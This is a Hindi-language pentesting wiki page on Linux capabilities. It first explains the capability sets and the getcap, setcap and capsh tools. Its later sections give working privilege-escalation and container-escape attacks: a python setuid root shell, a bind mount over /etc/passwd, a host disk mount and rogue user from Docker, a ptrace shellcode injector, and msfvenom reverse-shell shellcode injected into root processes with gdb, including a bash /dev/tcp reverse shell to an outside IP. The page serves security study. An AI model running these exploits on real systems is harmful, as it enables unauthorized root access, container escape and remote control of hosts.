# Linux Capabilities

{{#include ../../banners/hacktricks-training.md}}

Linux capabilities **root privileges को छोटी, अलग-अलग इकाइयों में बाँटती हैं**, जिससे processes के पास privileges का एक subset हो सकता है। इससे बिना ज़रूरत full root privileges दिए जोखिम कम होते हैं।<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[14]](#references)</sup>

### समस्या:

- सामान्य users के पास raw sockets खोलने या 1024 से कम वाले Internet ports को bind करने जैसे operations के लिए सीमित permissions होती हैं; capabilities full root privilege के बजाय केवल आवश्यक operation की अनुमति दे सकती हैं।<sup>[[14]](#references)</sup>

### Capability Sets:

Linux हर thread के लिए ये capability sets उपलब्ध कराता है, और जब कोई process credentials बदलता है या किसी file को execute करता है, तो kernel इनकी पाबंदियाँ लागू करता है।<sup>[[14]](#references)</sup>

1. **Inherited (CapInh)**:

   - **उद्देश्य**: यह उन capabilities की पहचान करता है जो `execve()` के बाद permitted set में शामिल हो सकती हैं, जब executed file में इनसे मेल खाने वाली inheritable file capabilities हों।
   - **कार्यप्रणाली**: Thread का inheritable set `execve()` के दौरान बना रहता है; यह अपने-आप उन capabilities को effective नहीं बनाता।
   - **पाबंदियाँ**: इस set में capability जोड़ना permitted और bounding sets की सीमाओं के अधीन है।<sup>[[14]](#references)</sup>

2. **Effective (CapEff)**:

   - **उद्देश्य**: यह उन वास्तविक capabilities को दर्शाता है जिनका process किसी भी समय उपयोग कर रहा है।
   - **कार्यप्रणाली**: यह capabilities का वह set है जिसे kernel विभिन्न operations की अनुमति देने के लिए जाँचता है। Files के लिए, यह set एक flag हो सकता है जो बताता है कि file की permitted capabilities को effective माना जाना है या नहीं।
   - **महत्व**: तत्काल privilege checks के लिए effective set अहम है; यह capabilities का सक्रिय set है जिसका process उपयोग कर सकता है।

3. **Permitted (CapPrm)**:

   - **उद्देश्य**: यह उन capabilities का अधिकतम set तय करता है जो किसी process के पास हो सकती हैं।
   - **कार्यप्रणाली**: कोई process permitted set से capability को अपने effective set में ला सकता है, जिससे उसे उस capability का उपयोग करने की क्षमता मिलती है। वह अपने permitted set से capabilities हटा भी सकता है।
   - **सीमा**: अगर इस set से कोई capability हटा दी जाती है, तो उसे आम तौर पर उस capability को देने वाली file या किसी अन्य privileged transition को execute किए बिना वापस नहीं पाया जा सकता।<sup>[[14]](#references)</sup>

4. **Bounding (CapBnd)**:

   - **उद्देश्य**: यह उन capabilities को सीमित करता है जो process `execve()` के दौरान किसी file से पा सकता है और जिन्हें अपने inheritable set में जोड़ सकता है।
   - **कार्यप्रणाली**: यह set `fork()` के दौरान inherited और `execve()` के दौरान बना रहता है; caller के पास `CAP_SETPCAP` होने पर इसमें से capabilities हटाई जा सकती हैं।
   - **उपयोग**: इस set से गैर-ज़रूरी capabilities हटाने से बाद में privileges हासिल करने की क्षमता सीमित होती है।<sup>[[14]](#references)</sup>

5. **Ambient (CapAmb)**:
   - **उद्देश्य**: यह चुनी हुई capabilities को किसी गैर-privileged program के `execve()` के बाद भी permitted और effective बने रहने देता है।
   - **कार्यप्रणाली**: जब executed file privileged न हो, तब ambient capabilities नए permitted और effective sets में जोड़ दी जाती हैं।
   - **पाबंदियाँ**: कोई capability ambient तभी हो सकती है, जब वह permitted और inheritable—दोनों sets में मौजूद हो; set-user-ID/set-group-ID file या capabilities वाली file execute करने पर ambient set साफ़ हो जाता है।<sup>[[8]](#references)[[9]](#references)[[14]](#references)</sup>

## Processes और Binaries की Capabilities

### Processes की Capabilities

किसी खास process की capabilities देखने के लिए, /proc directory में मौजूद **status** file का उपयोग करें। इसमें अधिक जानकारी होती है, इसलिए आइए इसे केवल Linux capabilities से जुड़ी जानकारी तक सीमित रखें।\
ध्यान दें कि सभी running processes के लिए capability की जानकारी हर thread के आधार पर रखी जाती है, जबकि file capabilities `security.capability` extended attributes में संग्रहीत होती हैं।<sup>[[14]](#references)[[15]](#references)</sup>

आप /usr/include/linux/capability.h में परिभाषित capabilities देख सकते हैं।

आप `cat /proc/self/status` या `capsh --print` से मौजूदा process की capabilities देख सकते हैं, और दूसरे processes की capabilities `/proc/<pid>/status` में देख सकते हैं।<sup>[[15]](#references)[[26]](#references)</sup>

```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```

यह command अधिकांश systems पर capabilities की पाँच lines लौटाना चाहिए।<sup>[[15]](#references)</sup>

- CapInh = Inherited capabilities
- CapPrm = Permitted capabilities
- CapEff = Effective capabilities
- CapBnd = Bounding set
- CapAmb = Ambient capabilities set

```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```

ये hexadecimal संख्याएँ समझ में नहीं आतीं। `capsh` utility का उपयोग करके, हम इन्हें capability names में decode कर सकते हैं।<sup>[[26]](#references)</sup>

```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```

अब `ping` द्वारा इस्तेमाल की जाने वाली **capabilities** की जाँच करते हैं:

```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

हालाँकि यह काम करता है, लेकिन एक और आसान तरीका है। किसी चल रही process की capabilities देखने के लिए, **getpcaps** tool के बाद उसका process ID (PID) दें; यह process IDs की सूची भी स्वीकार करता है।<sup>[[22]](#references)</sup>

```bash
getpcaps 1234
```

`tcpdump` को नेटवर्क स्निफ़ करने के लिए binary को `cap_net_admin` और `cap_net_raw` देने के बाद इसकी capabilities जाँचें (`tcpdump` process 9562 में चल रहा है)।<sup>[[22]](#references)[[25]](#references)</sup>

```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```

जैसा कि आप देख सकते हैं, capabilities किसी process की जाँच करने के दोनों तरीकों के परिणामों से मेल खाती हैं। `getpcaps` टूल किसी target process की capabilities क्वेरी करने के लिए libcap का उपयोग करता है और उन्हें टेक्स्ट रूप में प्रिंट करता है; यह एक या अधिक PIDs स्वीकार करता है।<sup>[[22]](#references)</sup>

### Binaries की Capabilities

Binaries में file capabilities हो सकती हैं, जो execution के दौरान लागू होती हैं। उदाहरण के लिए, किसी `ping` binary में `cap_net_raw` capability हो सकती है।<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```

आप `getcap -r` का उपयोग करके **capabilities वाले binaries** खोज सकते हैं।<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### capsh से capabilities हटाना

यदि हम prevailing bounding set से `CAP_NET_RAW` हटा दें, तो जिस प्रोग्राम को इस capability की आवश्यकता है, वह अब इसका उपयोग नहीं कर पाएगा।<sup>[[26]](#references)</sup>

```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```

_capsh_ के आउटपुट के अलावा, _tcpdump_ कमांड को भी एक त्रुटि दिखानी चाहिए।

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

इस त्रुटि से पता चलता है कि `CAP_NET_RAW` को bounding set से हटाने के बाद, `tcpdump` अनुरोधित file capability के साथ execute नहीं हो सकता।

### Capabilities हटाएँ

आप `setcap -r` से किसी फ़ाइल की capabilities हटा सकते हैं।<sup>[[25]](#references)</sup>

```bash
setcap -r </path/to/binary>
```

## User Capabilities

Linux login user को सीधे file capabilities असाइन नहीं करता, लेकिन `pam_cap` PAM module, authenticated sessions के लिए `/etc/security/capability.conf` का उपयोग करके inheritable capabilities सेट कर सकता है।<sup>[[16]](#references)</sup> हर entry, comma-separated capability names या numbers को एक या अधिक usernames से मैप करती है।<sup>[[17]](#references)</sup>
फ़ाइल का उदाहरण:

```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```

## Environment Capabilities

निम्नलिखित प्रोग्राम को compile करने से **ऐसे environment के अंदर bash shell spawn करना संभव हो जाता है जो capabilities प्रदान करता है**।<sup>[[14]](#references)</sup>

```c:ambient.c
/*
 * Test program for the ambient capabilities
 *
 * compile using:
 * gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
 * Set effective, inherited and permitted capabilities to the compiled binary
 * sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
 *
 * To get a shell with additional caps that can be inherited do:
 *
 * ./ambient /bin/bash
 */

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
  int rc;
  capng_get_caps_process();
  rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
  if (rc) {
    printf("Cannot add inheritable cap\n");
    exit(2);
  }
  capng_apply(CAPNG_SELECT_CAPS);
  /* Note the two 0s at the end. Kernel checks for these */
  if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
    perror("Cannot set cap");
    exit(1);
  }
}
void usage(const char * me) {
  printf("Usage: %s [-c caps] new-program new-args\n", me);
  exit(1);
}
int default_caplist[] = {
  CAP_NET_RAW,
  CAP_NET_ADMIN,
  CAP_SYS_NICE,
  -1
};
int * get_caplist(const char * arg) {
  int i = 1;
  int * list = NULL;
  char * dup = strdup(arg), * tok;
  for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
    list = realloc(list, (i + 1) * sizeof(int));
    if (!list) {
      perror("out of memory");
      exit(1);
    }
    list[i - 1] = atoi(tok);
    list[i] = -1;
    i++;
  }
  return list;
}
int main(int argc, char ** argv) {
  int rc, i, gotcaps = 0;
  int * caplist = NULL;
  int index = 1; // argv index for cmd to start
  if (argc < 2)
    usage(argv[0]);
  if (strcmp(argv[1], "-c") == 0) {
    if (argc <= 3) {
      usage(argv[0]);
    }
    caplist = get_caplist(argv[2]);
    index = 3;
  }
  if (!caplist) {
    caplist = (int * ) default_caplist;
  }
  for (i = 0; caplist[i] != -1; i++) {
    printf("adding %d to ambient list\n", caplist[i]);
    set_ambient_cap(caplist[i]);
  }
  printf("Ambient forking shell\n");
  if (execv(argv[index], argv + index))
    perror("Cannot exec");
  return 0;
}
```

```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```

compiled ambient binary द्वारा executed **bash** के अंदर, **new capabilities** को देखा जा सकता है (एक regular user के पास "current" section में कोई capability नहीं होगी).<sup>[[14]](#references)</sup>

```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```

> [!CAUTION]
> आप **केवल वही capabilities जोड़ सकते हैं जो permitted और inheritable, दोनों sets में मौजूद हों।**<sup>[[14]](#references)</sup>

### Capability-aware/Capability-dumb binaries

Capability-dumb binary ऐसा प्रोग्राम होता है जिसमें file capabilities होती हैं, लेकिन उन्हें manage करने के लिए वह libcap का इस्तेमाल नहीं करता। यदि उसका file effective bit set है, तो kernel process के effective set में file की permitted capabilities enable कर देता है; यदि process को सभी permitted capabilities नहीं मिली हों, तो execution fail हो सकता है।<sup>[[14]](#references)</sup>

## Service Capabilities

Root के रूप में चलने वाली system service के पास व्यापक capabilities बनी रह सकती हैं, जब तक कि उसका execution environment उन्हें सीमित न करे। systemd unit में, `User=` service user चुनता है और `AmbientCapabilities=` execute किए गए process के ambient set में नामित capabilities जोड़ता है।<sup>[[18]](#references)</sup>

```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```

## Docker Containers में Capabilities

Docker containers को एक default capability set के साथ शुरू करता है, जिसे `--cap-add` और `--cap-drop` से बदला जा सकता है; `amicontained` से किसी container की जाँच की जा सकती है।<sup>[[19]](#references)[[24]](#references)</sup>

```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
	BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```

## Privesc/Container Escape

Capabilities तब उपयोगी होते हैं जब आप **privileged operations करने के बाद अपनी प्रक्रियाओं को प्रतिबंधित करना चाहते हैं** (जैसे chroot सेट करने और socket से bind करने के बाद)। हालांकि, उन्हें malicious commands या arguments देकर exploit किया जा सकता है, जिन्हें फिर root के रूप में चलाया जाता है।<sup>[[2]](#references)</sup>

आप `setcap` से प्रोग्राम पर file capabilities लागू कर सकते हैं और `getcap` से उन्हें query कर सकते हैं।<sup>[[23]](#references)[[25]](#references)</sup>

```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```

file-capability text में, `+ep` नामित capability को effective और permitted sets में बढ़ाता है; `-` चुने गए flags को घटाता है।<sup>[[21]](#references)</sup>

किसी system या folder में capabilities वाले programs की पहचान करने के लिए, `getcap -r` का उपयोग करें।<sup>[[23]](#references)</sup>

```bash
getcap -r / 2>/dev/null
```

### Exploitation का उदाहरण

निम्नलिखित उदाहरण में `/usr/bin/python2.6` binary को privesc के लिए vulnerable पाया गया है:

```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```

**Capabilities** जो `tcpdump` को **किसी भी उपयोगकर्ता को packets sniff करने की अनुमति देने** के लिए चाहिए:

```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

### छोड़े गए capability नाम का विशेष मामला

libcap के text format में, `getcap myelf` का `myelf =ep` रिपोर्ट करना मतलब है कि **सभी capabilities** effective और permitted चिह्नित हैं, जो executing process के bounding set, user namespace और अन्य execution restrictions के अधीन हैं। खाली file capability set `myelf =` होता है (जिसमें `e` या `p` नहीं होता); यह ऐसी file से अलग है जिसमें कोई capability attribute नहीं है। `=ep` file अपने-आप process UID को root में नहीं बदलती, लेकिन `CAP_DAC_READ_SEARCH` या `CAP_DAC_OVERRIDE` का उपयोग कर सकने वाला program ऐसी files पढ़ सकता है जिन्हें उसकी Unix UID अन्यथा नहीं पढ़ सकती। किसी file-read path को privileged मानने से पहले वास्तविक executable का file mode, namespace और effective capabilities सत्यापित करें। libcap का [capability text format](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html) और [empty-value behavior](https://man7.org/linux/man-pages/man8/getcap.8.html) देखें।<sup>[[14]](#references)</sup>

## CAP_SYS_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** एक अत्यंत शक्तिशाली Linux capability है, जिसे अक्सर इसकी व्यापक **administrative privileges** के कारण लगभग root-स्तर के बराबर माना जाता है। इन privileges में devices mount करना या kernel features में बदलाव करना शामिल है। पूरे systems का simulation करने वाले containers के लिए यह अनिवार्य हो सकती है, लेकिन **`CAP_SYS_ADMIN` गंभीर security चुनौतियाँ पैदा करती है**, खासकर containerized environments में, क्योंकि इससे privilege escalation और system compromise हो सकता है। इसलिए, इसके उपयोग की कड़ी security जाँच और सावधानीपूर्वक management आवश्यक है। **principle of least privilege** का पालन करने और attack surface को कम करने के लिए application-specific containers में इस capability को हटाने को प्राथमिकता दें।<sup>[[14]](#references)</sup>

Namespace pivots के लिए scope महत्वपूर्ण है: `setns()` target का owner user namespace के संदर्भ में `CAP_SYS_ADMIN` जाँचता है। किसी mount namespace में प्रवेश करने के लिए caller के user namespace में `CAP_SYS_CHROOT` भी आवश्यक है। इसलिए, केवल किसी private remapped user namespace के भीतर मौजूद capability initial host namespaces में मनमाने ढंग से प्रवेश की अनुमति नहीं देती।<sup>[[14]](#references)</sup>

**binary के साथ उदाहरण**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```

Python का उपयोग करके, आप संशोधित _passwd_ फ़ाइल को असली _passwd_ फ़ाइल के ऊपर mount कर सकते हैं:

```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```

और अंत में संशोधित `passwd` फ़ाइल को `/etc/passwd` पर **mount** करें:

```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

और आप "password" पासवर्ड का उपयोग करके **root के रूप में `su`** कर पाएँगे।

**पर्यावरण के साथ उदाहरण (Docker breakout)**

आप docker container के अंदर सक्षम capabilities को इस तरह जाँच सकते हैं:

```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
 secure-noroot: no (unlocked)
 secure-no-suid-fixup: no (unlocked)
 secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```

पिछले आउटपुट में आप देख सकते हैं कि SYS_ADMIN capability enabled है।<sup>[[14]](#references)</sup>

- **Mount**

उपयुक्त device और namespace access के साथ, इससे Docker container को **host disk mount करने और उसकी सामग्री तक पहुँचने** की अनुमति मिल सकती है। Device node को किसी वास्तविक host device को दर्शाना चाहिए, device cgroup को इसकी अनुमति देनी चाहिए, और block-based filesystem को mount करने के लिए initial user namespace में `CAP_SYS_ADMIN` होना आवश्यक है।<sup>[[14]](#references)</sup>

```bash
lsblk -o NAME,PATH,TYPE,SIZE,FSTYPE,MOUNTPOINTS
node_root_device=/dev/sda1 # Replace with the validated filesystem partition or LV.
mkdir -p /mnt/host
mount -o ro "${node_root_device}" /mnt/host
cat /mnt/host/etc/hostname
umount /mnt/host
```

- **पूर्ण access**

पिछले तरीके में हम host disk को access करने में सफल रहे।\
अगर host पर **ssh** server चल रहा है, तो आप **mounted disk के अंदर एक user बना सकते हैं** और SSH के ज़रिए उसे access कर सकते हैं।<sup>[[14]](#references)</sup>

```bash
#Like in the example before, the first step is to mount the docker host disk
node_root_device=/dev/sda1
mount "${node_root_device}" /mnt/host

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/host adduser john
ssh john@172.17.0.1 -p 2222
```

`/mnt/host` के तहत सीधे पढ़ना और लिखना पहले से ही host-filesystem access है। अंतिम `chroot` केवल pathname की सुविधा देता है और इसके लिए `CAP_SYS_CHROOT` भी आवश्यक है; यही वह चरण नहीं है जो escape संभव बनाता है।

## CAP_SYS_PTRACE

`CAP_SYS_PTRACE` के साथ कोई process अपने PID namespace में दिखाई देने वाले अन्य processes को trace और inspect कर सकता है। Docker container से host processes को target करने के लिए, `--pid=host` के साथ host PID namespace साझा करें (या ऐसे namespace में शामिल हों जिसमें target मौजूद हो)।<sup>[[14]](#references)[[20]](#references)</sup>

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**, `ptrace(2)` और `process_vm_readv(2)` तथा `process_vm_writev(2)` जैसी cross-memory attach calls द्वारा दी जाने वाली debugging और system call tracing सुविधाओं का उपयोग करने की क्षमता देता है। निदान और monitoring के लिए शक्तिशाली होने के बावजूद, यदि `CAP_SYS_PTRACE` को `ptrace(2)` पर seccomp filter जैसे प्रतिबंधात्मक उपायों के बिना सक्षम किया जाए, तो यह system security को गंभीर रूप से कमजोर कर सकता है। विशेष रूप से, इसका उपयोग अन्य security restrictions को दरकिनार करने के लिए किया जा सकता है, खासकर seccomp द्वारा लागू प्रतिबंधों को, जैसा कि [इस जैसे proof of concept (PoC)](https://gist.github.com/thejh/8346f47e359adecd1d53) में दिखाया गया है।<sup>[[10]](#references)</sup>

**binary के साथ उदाहरण (python)**

```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
    _fields_ = [
        ("r15", ctypes.c_ulonglong),
        ("r14", ctypes.c_ulonglong),
        ("r13", ctypes.c_ulonglong),
        ("r12", ctypes.c_ulonglong),
        ("rbp", ctypes.c_ulonglong),
        ("rbx", ctypes.c_ulonglong),
        ("r11", ctypes.c_ulonglong),
        ("r10", ctypes.c_ulonglong),
        ("r9", ctypes.c_ulonglong),
        ("r8", ctypes.c_ulonglong),
        ("rax", ctypes.c_ulonglong),
        ("rcx", ctypes.c_ulonglong),
        ("rdx", ctypes.c_ulonglong),
        ("rsi", ctypes.c_ulonglong),
        ("rdi", ctypes.c_ulonglong),
        ("orig_rax", ctypes.c_ulonglong),
        ("rip", ctypes.c_ulonglong),
        ("cs", ctypes.c_ulonglong),
        ("eflags", ctypes.c_ulonglong),
        ("rsp", ctypes.c_ulonglong),
        ("ss", ctypes.c_ulonglong),
        ("fs_base", ctypes.c_ulonglong),
        ("gs_base", ctypes.c_ulonglong),
        ("ds", ctypes.c_ulonglong),
        ("es", ctypes.c_ulonglong),
        ("fs", ctypes.c_ulonglong),
        ("gs", ctypes.c_ulonglong),
    ]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
    # Convert the byte to little endian.
    shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
    shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
    shellcode_byte=int(shellcode_byte_little_endian,16)

    # Inject the byte.
    libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```

**बाइनरी के साथ उदाहरण (gdb)**

`gdb` में `ptrace` क्षमता:

```
/usr/bin/gdb = cap_sys_ptrace+ep
```

debugger पर capability केवल जांच का सुराग है। जाँचें कि क्या मौजूदा process उस सटीक file को execute कर सकता है (group और ACL permissions सहित), execution के बाद `CAP_SYS_PTRACE` effective है या नहीं, और क्या अधिक privileges वाला target उसी PID namespace में दिखाई देता है और उससे attach किया जा सकता है। `no_new_privs`, `nosuid` mount, capability bounding set, Yama, seccomp या कोई LSM नतीजे को बदल सकता है। [`capabilities(7)`](https://man7.org/linux/man-pages/man7/capabilities.7.html) और [kernel का Yama documentation](https://docs.kernel.org/admin-guide/LSM/Yama.html) देखें। किसी target से attach हुए बिना file और process metadata enumerate करें।

gdb के जरिए memory में inject करने के लिए msfvenom से shellcode बनाएं

```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
buf += b"\x6a\x03\x5e\x48\xff\xce\x6a\x21\x58\x0f\x05\x75"
buf += b"\xf6\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f"
buf += b"\x73\x68\x00\x53\x48\x89\xe7\x52\x57\x48\x89\xe6"
buf += b"\x0f\x05"

# Divisible by 8
payload = b"\x90" * (-len(buf) % 8) + buf

# Change endianess and print gdb lines to load the shellcode in RIP directly
for i in range(0, len(buf), 8):
	chunk = payload[i:i+8][::-1]
	chunks = "0x"
	for byte in chunk:
		chunks += f"{byte:02x}"

	print(f"set {{long}}($rip+{i}) = {chunks}")
```

root process को gdb से debug करें और पहले से जनरेट की गई gdb lines को copy-paste करें:

```bash
# Let's write the commands to a file
echo 'set {long}($rip+0) = 0x296a909090909090
set {long}($rip+8) = 0x5e016a5f026a9958
set {long}($rip+16) = 0x0002b9489748050f
set {long}($rip+24) = 0x48510b0e0a0a2923
set {long}($rip+32) = 0x582a6a5a106ae689
set {long}($rip+40) = 0xceff485e036a050f
set {long}($rip+48) = 0x6af675050f58216a
set {long}($rip+56) = 0x69622fbb4899583b
set {long}($rip+64) = 0x8948530068732f6e
set {long}($rip+72) = 0x050fe689485752e7
c' > commands.gdb
# In this case there was a sleep run by root
## NOTE that the process you abuse will die after the shellcode
/usr/bin/gdb -p $(pgrep sleep)
[...]
(gdb) source commands.gdb
Continuing.
process 207009 is executing new program: /usr/bin/dash
[...]
```

**environment के साथ उदाहरण (Docker breakout) - gdb का एक और दुरुपयोग**

अगर **GDB** इंस्टॉल है (या आप इसे `apk add gdb` या `apt install gdb` से इंस्टॉल कर सकते हैं), तो आप **दिखाई देने वाली host process को debug** करके उससे `system` function call करवा सकते हैं। इसके लिए target के user namespace में effective `CAP_SYS_PTRACE` और host PID visibility ज़रूरी है; `CAP_SYS_ADMIN` की **ज़रूरत नहीं** है। फिर भी Yama, non-dumpable state, seccomp और LSM policy attach को रोक सकते हैं।

```bash
gdb -p 1234
(gdb) call (void)system("ls")
(gdb) call (void)system("sleep 5")
(gdb) call (void)system("bash -c 'bash -i >& /dev/tcp/192.168.115.135/5656 0>&1'")
```

